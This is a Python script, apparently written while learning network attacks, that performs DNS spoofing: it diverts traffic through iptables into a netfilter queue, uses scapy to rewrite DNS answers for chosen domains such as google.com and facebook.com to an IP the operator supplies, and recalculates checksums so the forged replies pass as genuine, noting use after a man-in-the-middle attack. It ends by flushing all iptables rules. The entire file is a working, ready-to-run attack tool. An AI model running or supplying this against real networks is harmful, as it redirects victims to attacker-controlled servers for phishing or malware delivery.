import os
import netfilterqueue
import scapy.all as scapy

targets = ['google.com', 'bing.com', 'facebook.com', 'instagram.com', 'twitter.com']
spoof_ip = '127.0.0.1'


def process_packet(packet):
    # print(packet)
    # this prints basic info about the packet
    # print(packet.get_payload())
    # this prints the contents of the packet
    # we know a lot about scapy packets, so we'll be converting this stupid packet to scapy
    scapy_pack = scapy.IP(packet.get_payload())

    if scapy_pack.haslayer(scapy.DNSRR):
        # scapy.DNSRR stands for DNS response
        # scapy.DNSQR stands for DNS Request
        # we want to modify DNS Response from official DNS Server and spoof everything
        # now that we know the packet has a DNS record, we need to extract the info
        # to find correct fields and stuff, use scapy_pack.show()
        qname = scapy_pack[scapy.DNSQR].qname
        print(qname)
        for target in targets:
            if target in str(qname):
                print("[+] Target encountered")
                reply = scapy.DNSRR(rrname=qname, rdata=spoof_ip)
                # Scapy will autofill the rest of the fields
                # reply is the spoofed DNSRR Field
                # we'll now put replace the spoof and the actual packet
                scapy_pack[scapy.DNS].an = reply
                # in scapy_pack.show(), an is the field where the answers are contained
                # there may be more than one entry in the an field
                # this number corresponds to ancount field
                # so we'll change this one as well
                scapy_pack[scapy.DNS].ancount = 1

                # now we need to modify the length and checksum layers so that it looks perfectly legit
                # if we don't, this packet will be considered to be corrupted
                # what we do is, delete these fields, scapy will re compute them, and autofill them in

                del scapy_pack[scapy.IP].len
                del scapy_pack[scapy.IP].chksum
                del scapy_pack[scapy.UDP].len
                del scapy_pack[scapy.UDP].chksum

                # now the scapy packet is our spoofed packet

                packet.set_payload(bytes(scapy_pack))
                # now packet is out spoofed packet in correct format

    packet.accept()
    # now this statement accepts the packets and forwards them
    # but what if we want to drop the packets
    # packet.drop()
    # this will drop the packet


def main():
    global targets
    global spoof_ip

    # packets go into the FORWARD chain only if they're coming from another computer.
    # so the line below is for when you've successfully completed an MITM attack
    # os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
    # here we're taking all packets in the FORWARD and putting them into a queue with index no 0

    # packets go into the OUTPUT chain when they're coming from your own computer.
    # so the line below is for when you wanna modify packets you're sending to some place
    os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 0")
    os.system("iptables -I INPUT -j NFQUEUE --queue-num 0")
    # the first statement queues up the requests from machine to server
    # the second statement queues up the requests from server to machine

    queue = netfilterqueue.NetfilterQueue()
    # queuing up the packets together so that we can modify them
    queue.bind(0, process_packet)
    # This allows us to connect/bind to the queue created in the command
    # queue.bind(0, process_packet)
    # The process packet will be called  and the 0 is the id of queue in the command

    print("[+] Default target list is")
    print(targets)
    choice = input("\n[+] Would you like to add targets to default list [A/a] or recreate list again [R/r] or use "
                   "default [D/d]?\n")
    if choice == 'A' or choice == 'a':
        while True:
            next_ele = input("[+] Enter target, or Q to quit\n")
            if next_ele == "Q":
                break
            else:
                targets.append(next_ele)
    elif choice == 'R' or choice == 'r':
        targets.clear()
        while True:
            next_ele = input("[+] Enter target, or Q to quit\n")
            if next_ele == "Q":
                break
            else:
                targets.append(next_ele)

    spoof_ip = input("[+] Enter IP that you'd like to spoof to i.e. Spoofing Server IP\n")

    print("[+] Current target list is")
    print(targets)
    print("[+] Spoofing IP is")
    print(spoof_ip)

    try:
        queue.run()
    except KeyboardInterrupt:
        print("[-] Keyboard Interrupt detected, quitting...")
    except:
        print("[-] Some Error has occurred, quitting")

    # we even have to restore our IPtables rules back to normal
    os.system("iptables --flush")
    print("[+] IPtables restored to normal")


main()
